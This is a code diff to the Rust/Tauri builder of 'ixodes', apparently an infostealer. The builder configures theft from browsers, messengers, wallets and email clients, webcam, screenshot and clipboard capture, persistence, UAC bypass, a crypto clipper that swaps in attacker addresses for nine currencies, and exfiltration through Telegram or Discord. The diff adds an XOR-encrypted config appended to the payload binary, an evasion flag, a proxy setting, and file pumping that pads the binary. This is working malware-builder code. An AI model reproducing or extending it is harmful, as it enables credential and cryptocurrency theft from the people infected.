@@ -1,5 +1,6 @@
 use image::GenericImageView;
 use serde::{Deserialize, Serialize};
+use std::collections::HashSet;
 use std::fs;
 use std::path::{Path, PathBuf};
 use std::process::Command;
@@ -47,6 +48,7 @@ struct RecoverySettings {
     capture_clipboard: Option<bool>,
     persistence: Option<bool>,
     uac_bypass: Option<bool>,
+    evasion: Option<bool>,
     clipper: Option<bool>,
     melt: Option<bool>,
     loader_url: Option<String>,
@@ -63,6 +65,39 @@ struct RecoverySettings {
     blocked_countries: Option<Vec<String>>,
     custom_extensions: Option<Vec<String>>,
     custom_keywords: Option<Vec<String>>,
+    proxy_server: Option<String>,
+}
+
+#[derive(Debug, Serialize)]
+struct PayloadConfig {
+    pub allowed_categories: Option<HashSet<String>>,
+    pub artifact_key: Option<String>,
+    pub capture_screenshots: Option<bool>,
+    pub capture_webcams: Option<bool>,
+    pub capture_clipboard: Option<bool>,
+    pub persistence_enabled: Option<bool>,
+    pub uac_bypass_enabled: Option<bool>,
+    pub evasion_enabled: Option<bool>,
+    pub clipper_enabled: Option<bool>,
+    pub melt_enabled: Option<bool>,
+    pub btc_address: Option<String>,
+    pub eth_address: Option<String>,
+    pub ltc_address: Option<String>,
+    pub xmr_address: Option<String>,
+    pub doge_address: Option<String>,
+    pub dash_address: Option<String>,
+    pub sol_address: Option<String>,
+    pub trx_address: Option<String>,
+    pub ada_address: Option<String>,
+    pub telegram_token: Option<String>,
+    pub telegram_chat_id: Option<String>,
+    pub discord_webhook: Option<String>,
+    pub loader_url: Option<String>,
+    pub proxy_server: Option<String>,
+    pub pump_size_mb: Option<u32>,
+    pub blocked_countries: Option<HashSet<String>>,
+    pub custom_extensions: Option<HashSet<String>>,
+    pub custom_keywords: Option<HashSet<String>>,
 }
 
 #[derive(Debug, Deserialize)]
@@ -87,214 +122,6 @@ fn recovery_dir(ixodes_root: &Path) -> PathBuf {
 
 fn defaults_path(ixodes_root: &Path) -> PathBuf {
     recovery_dir(ixodes_root).join("defaults.rs")
-}
-
-fn escape_rust_string(value: &str) -> String {
-    value.replace('\\', "\\\\").replace('"', "\\\"")
-}
-
-fn render_defaults_rs(settings: &RecoverySettings) -> Result<String, String> {
-    let valid_categories = [
-        "Browsers",
-        "Messengers",
-        "Gaming",
-        "EmailClients",
-        "VPNs",
-        "Wallets",
-        "System",
-        "Other",
-    ];
-
-    for category in &settings.allowed_categories {
-        if !valid_categories.contains(&category.as_str()) {
-            return Err(format!("unknown recovery category: {category}"));
-        }
-    }
-
-    let default_categories = if settings.allowed_categories.is_empty() {
-        "None".to_string()
-    } else {
-        let items = settings
-            .allowed_categories
-            .iter()
-            .map(|category| format!("RecoveryCategory::{category}"))
-            .collect::<Vec<_>>()
-            .join(", ");
-        format!("Some(&[{items}])")
-    };
-
-    let default_artifact_key = settings
-        .artifact_key
-        .as_deref()
-        .map(str::trim)
-        .filter(|value| !value.is_empty())
-        .map(escape_rust_string);
-
-    let default_artifact_key = match default_artifact_key {
-        Some(value) => format!("Some(\"{value}\")"),
-        None => "None".to_string(),
-    };
-
-    let default_capture_screenshots = settings.capture_screenshots.unwrap_or(false);
-    let default_capture_webcams = settings.capture_webcams.unwrap_or(false);
-    let default_capture_clipboard = settings.capture_clipboard.unwrap_or(false);
-    let default_persistence = settings.persistence.unwrap_or(false);
-    let default_uac_bypass = settings.uac_bypass.unwrap_or(false);
-    let default_clipper = settings.clipper.unwrap_or(false);
-    let default_melt = settings.melt.unwrap_or(true);
-
-    let default_loader_url = settings
-        .loader_url
-        .as_deref()
-        .map(str::trim)
-        .filter(|v| !v.is_empty())
-        .map(|v| format!("Some(\"{}\")", escape_rust_string(v)))
-        .unwrap_or_else(|| "None".to_string());
-
-    let default_btc = settings.btc_address.as_deref().map(escape_rust_string);
-    let default_eth = settings.eth_address.as_deref().map(escape_rust_string);
-    let default_ltc = settings.ltc_address.as_deref().map(escape_rust_string);
-    let default_xmr = settings.xmr_address.as_deref().map(escape_rust_string);
-    let default_doge = settings.doge_address.as_deref().map(escape_rust_string);
-    let default_dash = settings.dash_address.as_deref().map(escape_rust_string);
-    let default_sol = settings.sol_address.as_deref().map(escape_rust_string);
-    let default_trx = settings.trx_address.as_deref().map(escape_rust_string);
-    let default_ada = settings.ada_address.as_deref().map(escape_rust_string);
-    
-    let format_opt = |opt: Option<String>| match opt {
-        Some(v) => format!("Some(\"{}\")", v),
-        None => "None".to_string(),
-    };
-
-    let default_btc_val = format_opt(default_btc);
-    let default_eth_val = format_opt(default_eth);
-    let default_ltc_val = format_opt(default_ltc);
-    let default_xmr_val = format_opt(default_xmr);
-    let default_doge_val = format_opt(default_doge);
-    let default_dash_val = format_opt(default_dash);
-    let default_sol_val = format_opt(default_sol);
-    let default_trx_val = format_opt(default_trx);
-    let default_ada_val = format_opt(default_ada);
-
-    let default_pump_size_mb = settings.pump_size_mb.unwrap_or(0);
-
-    let default_blocked_countries = if let Some(countries) = &settings.blocked_countries {
-        if countries.is_empty() {
-            "None".to_string()
-        } else {
-            let items = countries
-                .iter()
-                .map(|c| format!("\"{}\"", escape_rust_string(c)))
-                .collect::<Vec<_>>()
-                .join(", ");
-            format!("Some(&[{items}])")
-        }
-    } else {
-        "None".to_string()
-    };
-
-    let default_custom_extensions = if let Some(exts) = &settings.custom_extensions {
-        if exts.is_empty() {
-            "None".to_string()
-        } else {
-            let items = exts
-                .iter()
-                .map(|s| format!("\"{}\"", escape_rust_string(s)))
-                .collect::<Vec<_>>()
-                .join(", ");
-            format!("Some(&[{items}])")
-        }
-    } else {
-        "None".to_string()
-    };
-
-    let default_custom_keywords = if let Some(kws) = &settings.custom_keywords {
-        if kws.is_empty() {
-            "None".to_string()
-        } else {
-            let items = kws
-                .iter()
-                .map(|s| format!("\"{}\"", escape_rust_string(s)))
-                .collect::<Vec<_>>()
-                .join(", ");
-            format!("Some(&[{items}])")
-        }
-    } else {
-        "None".to_string()
-    };
-
-    let default_telegram_token = settings
-        .telegram_token
-        .as_deref()
-        .map(str::trim)
-        .filter(|v| !v.is_empty())
-        .map(|v| format!("Some(\"{}\")", escape_rust_string(v)))
-        .unwrap_or_else(|| "None".to_string());
-
-    let default_telegram_chat_id = settings
-        .telegram_chat_id
-        .as_deref()
-        .map(str::trim)
-        .filter(|v| !v.is_empty())
-        .map(|v| format!("Some(\"{}\")", escape_rust_string(v)))
-        .unwrap_or_else(|| "None".to_string());
-
-    let default_discord_webhook = settings
-        .discord_webhook
-        .as_deref()
-        .map(str::trim)
-        .filter(|v| !v.is_empty())
-        .map(|v| format!("Some(\"{}\")", escape_rust_string(v)))
-        .unwrap_or_else(|| "None".to_string());
-
-    Ok(format!(
-        r#"use crate::recovery::task::RecoveryCategory;
-
-pub static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = {default_categories};
-pub static DEFAULT_ARTIFACT_KEY: Option<&str> = {default_artifact_key};
-pub static DEFAULT_CAPTURE_SCREENSHOTS: bool = {default_capture_screenshots};
-pub static DEFAULT_CAPTURE_WEBCAMS: bool = {default_capture_webcams};
-pub static DEFAULT_CAPTURE_CLIPBOARD: bool = {default_capture_clipboard};
-pub static DEFAULT_PERSISTENCE: bool = {default_persistence};
-pub static DEFAULT_UAC_BYPASS: bool = {default_uac_bypass};
-pub static DEFAULT_CLIPPER_ENABLED: bool = {default_clipper};
-pub static DEFAULT_MELT_ENABLED: bool = {default_melt};
-pub static DEFAULT_LOADER_URL: Option<&str> = {default_loader_url};
-pub static DEFAULT_BTC_ADDRESS: Option<&str> = {default_btc_val};
-pub static DEFAULT_ETH_ADDRESS: Option<&str> = {default_eth_val};
-pub static DEFAULT_LTC_ADDRESS: Option<&str> = {default_ltc_val};
-pub static DEFAULT_XMR_ADDRESS: Option<&str> = {default_xmr_val};
-pub static DEFAULT_DOGE_ADDRESS: Option<&str> = {default_doge_val};
-pub static DEFAULT_DASH_ADDRESS: Option<&str> = {default_dash_val};
-pub static DEFAULT_SOL_ADDRESS: Option<&str> = {default_sol_val};
-pub static DEFAULT_TRX_ADDRESS: Option<&str> = {default_trx_val};
-pub static DEFAULT_ADA_ADDRESS: Option<&str> = {default_ada_val};
-pub static DEFAULT_PUMP_SIZE_MB: u32 = {default_pump_size_mb};
-pub static DEFAULT_BLOCKED_COUNTRIES: Option<&[&str]> = {default_blocked_countries};
-pub static DEFAULT_CUSTOM_EXTENSIONS: Option<&[&str]> = {default_custom_extensions};
-pub static DEFAULT_CUSTOM_KEYWORDS: Option<&[&str]> = {default_custom_keywords};
-pub static DEFAULT_TELEGRAM_TOKEN: Option<&str> = {default_telegram_token};
-pub static DEFAULT_TELEGRAM_CHAT_ID: Option<&str> = {default_telegram_chat_id};
-pub static DEFAULT_DISCORD_WEBHOOK: Option<&str> = {default_discord_webhook};
-"#,
-        default_categories = default_categories,
-        default_artifact_key = default_artifact_key,
-        default_capture_screenshots = default_capture_screenshots,
-        default_capture_webcams = default_capture_webcams,
-        default_capture_clipboard = default_capture_clipboard,
-        default_persistence = default_persistence,
-        default_uac_bypass = default_uac_bypass,
-        default_clipper = default_clipper,
-        default_melt = default_melt,
-        default_loader_url = default_loader_url,
-        default_btc_val = default_btc_val,
-        default_pump_size_mb = default_pump_size_mb,
-        default_blocked_countries = default_blocked_countries,
-        default_custom_extensions = default_custom_extensions,
-        default_custom_keywords = default_custom_keywords,
-        default_telegram_token = default_telegram_token,
-        default_telegram_chat_id = default_telegram_chat_id,
-    ))
 }
 
 #[tauri::command]
@@ -343,57 +170,22 @@ async fn build_ixodes(app: AppHandle, request: BuildRequest) -> Result<BuildResu
 
 fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResult, String> {
     let ixodes_root = ixodes_root()?;
-    let recovery_dir = recovery_dir(&ixodes_root);
-    let default_settings = defaults_path(&ixodes_root);
-    let backup_path = recovery_dir.join("defaults.rs.bak");
-    if !backup_path.exists() && default_settings.exists() {
-        fs::copy(&default_settings, &backup_path)
-            .map_err(|err| format!("failed to back up defaults.rs: {err}"))?;
-    }
-
-    let settings_rs = render_defaults_rs(&request.settings)?;
-    fs::write(&default_settings, settings_rs)
-        .map_err(|err| format!("failed to write defaults.rs: {err}"))?;
+    
+    // We no longer modify defaults.rs.
+    // Instead, we build the "template" binary and patch it.
 
     let mut command = Command::new("cargo");
     command
         .arg("build")
         .arg("--release")
         .current_dir(&ixodes_root)
+        // Pass necessary ENV vars that might be required for build.rs logic, if any.
+        // Assuming password is still baked in? If possible, move to dynamic config too.
+        // For now, keeping password as env var if it's used in build.rs for zip encryption.
         .env(
             "IXODES_PASSWORD",
             request.settings.archive_password.as_deref().unwrap_or(""),
-        )
-        .env(
-            "IXODES_MELT",
-            if request.settings.melt.unwrap_or(true) {
-                "true"
-            } else {
-                "false"
-            },
         );
-
-    if let Some(url) = &request.settings.loader_url {
-        if !url.is_empty() {
-            command.env("IXODES_LOADER_URL", url);
-        }
-    }
-
-    if let Some(token) = &request.settings.telegram_token {
-        if !token.is_empty() {
-            command.env("IXODES_TELEGRAM_TOKEN", token);
-        }
-    }
-    if let Some(chat_id) = &request.settings.telegram_chat_id {
-        if !chat_id.is_empty() {
-            command.env("IXODES_CHAT_ID", chat_id);
-        }
-    }
-    if let Some(webhook) = &request.settings.discord_webhook {
-        if !webhook.is_empty() {
-            command.env("IXODES_DISCORD_WEBHOOK", webhook);
-        }
-    }
 
     if let Some(branding) = request.branding.as_ref() {
         apply_branding_env(&app, &mut command, branding)?;
@@ -440,16 +232,65 @@ fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResul
         });
     }
 
+    // 2. Read Compiled Binary
+    let mut binary_data = fs::read(&exe_path)
+        .map_err(|err| format!("failed to read template binary: {err}"))?;
+
+    // 3. Pump Binary (if requested)
     if let Some(pump_mb) = request.settings.pump_size_mb {
         if pump_mb > 0 {
-            if let Err(err) = pump_file_on_server(&exe_path, pump_mb) {
-                combined = format!("{}\nWarning: server-side pumping failed: {}", combined.trim(), err);
-            } else {
-                combined = format!("{}\nInfo: binary pumped to {} MB", combined.trim(), pump_mb);
-            }
+            pump_binary_data(&mut binary_data, pump_mb);
+            combined = format!("{}\nInfo: binary pumped to {} MB", combined.trim(), pump_mb);
         }
     }
 
+    // 4. Create Payload Config
+    let config = PayloadConfig {
+        allowed_categories: if request.settings.allowed_categories.is_empty() {
+            None
+        } else {
+            Some(request.settings.allowed_categories.iter().cloned().collect())
+        },
+        artifact_key: request.settings.artifact_key.clone(),
+        capture_screenshots: request.settings.capture_screenshots,
+        capture_webcams: request.settings.capture_webcams,
+        capture_clipboard: request.settings.capture_clipboard,
+        persistence_enabled: request.settings.persistence,
+        uac_bypass_enabled: request.settings.uac_bypass,
+        evasion_enabled: request.settings.evasion,
+        clipper_enabled: request.settings.clipper,
+        melt_enabled: request.settings.melt,
+        btc_address: request.settings.btc_address.clone(),
+        eth_address: request.settings.eth_address.clone(),
+        ltc_address: request.settings.ltc_address.clone(),
+        xmr_address: request.settings.xmr_address.clone(),
+        doge_address: request.settings.doge_address.clone(),
+        dash_address: request.settings.dash_address.clone(),
+        sol_address: request.settings.sol_address.clone(),
+        trx_address: request.settings.trx_address.clone(),
+        ada_address: request.settings.ada_address.clone(),
+        telegram_token: request.settings.telegram_token.clone(),
+        telegram_chat_id: request.settings.telegram_chat_id.clone(),
+        discord_webhook: request.settings.discord_webhook.clone(),
+        loader_url: request.settings.loader_url.clone(),
+        proxy_server: request.settings.proxy_server.clone(),
+        pump_size_mb: request.settings.pump_size_mb,
+        blocked_countries: request.settings.blocked_countries.as_ref().map(|v| v.iter().cloned().collect()),
+        custom_extensions: request.settings.custom_extensions.as_ref().map(|v| v.iter().cloned().collect()),
+        custom_keywords: request.settings.custom_keywords.as_ref().map(|v| v.iter().cloned().collect()),
+    };
+
+    // 5. Serialize, Encrypt, and Append
+    let config_json = serde_json::to_string(&config)
+        .map_err(|err| format!("failed to serialize config: {err}"))?;
+    
+    let encrypted_config = xor_codec(config_json.as_bytes());
+
+    let delimiter = "::IXODES_CONFIG::";
+    binary_data.extend_from_slice(delimiter.as_bytes());
+    binary_data.extend_from_slice(&encrypted_config);
+
+    // 6. Write to Destination
     let moved_to = if let Some(output_dir) = request.output_dir.as_deref().map(str::trim) {
         if output_dir.is_empty() {
             None
@@ -458,8 +299,7 @@ fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResul
             if output_path.extension().is_some() {
                 Some(output_path)
             } else {
-                fs::create_dir_all(&output_path)
-                    .map_err(|err| format!("failed to create output directory: {err}"))?;
+                let _ = fs::create_dir_all(&output_path);
                 Some(output_path.join(exe_name))
             }
         }
@@ -475,21 +315,9 @@ fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResul
             .unwrap_or_else(|_| PathBuf::from(exe_name))
     });
 
-    if moved_to.exists() {
-        fs::remove_file(&moved_to)
-            .map_err(|err| format!("failed to remove existing output binary: {err}"))?;
-    }
-
-    if let Err(err) = fs::rename(&exe_path, &moved_to) {
-        fs::copy(&exe_path, &moved_to)
-            .map_err(|copy_err| format!("failed to copy exe to desktop: {copy_err}"))?;
-        fs::remove_file(&exe_path)
-            .map_err(|remove_err| format!("failed to remove original exe: {remove_err}"))?;
-        combined = format!(
-            "{}\nmove fallback used (rename failed: {err})",
-            combined.trim()
-        );
-    }
+    // Write final patched binary
+    fs::write(&moved_to, &binary_data)
+        .map_err(|err| format!("failed to write final binary to {}: {}", moved_to.display(), err))?;
 
     Ok(BuildResult {
         success: true,
@@ -497,6 +325,15 @@ fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResul
         exe_path: Some(exe_path.to_string_lossy().to_string()),
         moved_to: Some(moved_to.to_string_lossy().to_string()),
     })
+}
+
+fn xor_codec(data: &[u8]) -> Vec<u8> {
+    let key = b"9e2b4cb38d6890f845a7593430292211"; // Static 32-byte key
+    let mut output = data.to_vec();
+    for (i, byte) in output.iter_mut().enumerate() {
+        *byte ^= key[i % key.len()];
+    }
+    output
 }
 
 fn apply_branding_env(
@@ -545,70 +382,24 @@ fn set_env_if_present(command: &mut Command, key: &str, value: Option<&str>) {
     }
 }
 
-fn pump_file_on_server(path: &Path, target_mb: u32) -> Result<(), String> {
+fn pump_binary_data(data: &mut Vec<u8>, target_mb: u32) {
     use rand::Rng;
-    use std::io::{Seek, SeekFrom, Write};
-
+    
     let target_size = (target_mb as u64) * 1024 * 1024;
-    let mut file = fs::OpenOptions::new()
-        .read(true)
-        .write(true)
-        .open(path)
-        .map_err(|err| format!("failed to open exe for pumping: {err}"))?;
-
-    let current_size = file
-        .metadata()
-        .map_err(|err| format!("failed to get metadata: {err}"))?
-        .len();
+    let current_size = data.len() as u64;
 
     if current_size >= target_size {
-        return Ok(());
+        return;
     }
 
-    let needed = target_size - current_size;
-    file.seek(SeekFrom::End(0))
-
-        .map_err(|err| format!("failed to seek: {err}"))?;
-
+    let needed = (target_size - current_size) as usize;
     let mut rng = rand::thread_rng();
-    let chunk_size = 1024 * 512;
-    let mut remaining = needed;
+    let mut buffer = vec![0u8; needed];
 
-    while remaining > 0 {
-        let to_write = std::cmp::min(remaining, chunk_size as u64) as usize;
-        let mut buffer = vec![0u8; to_write];
-
-        let mode = rng.gen_range(0..4);
-        match mode {
-            0 => {
-                rng.fill(&mut buffer[..]);
-            }
-            1 => {
-                let pattern = [0x41, 0x42, 0x43, 0x44, 0x00];
-                for i in 0..to_write {
-                    buffer[i] = pattern[i % pattern.len()];
-                }
-            }
-            2 => {
-                for i in (0..to_write).step_by(16) {
-                    if rng.gen_bool(0.1) {
-                        buffer[i] = rng.r#gen();
-                    }
-                }
-            }
-            _ => {
-                for i in 0..to_write {
-                    buffer[i] = rng.gen_range(32..126);
-                }
-            }
-        }
-
-        file.write_all(&buffer)
-            .map_err(|err| format!("failed to write pumped data: {err}"))?;
-        remaining -= to_write as u64;
-    }
-
-    Ok(())
+    // Simple randomization
+    rng.fill(&mut buffer[..]);
+    
+    data.extend_from_slice(&buffer);
 }
 
 fn resolve_icon_path(
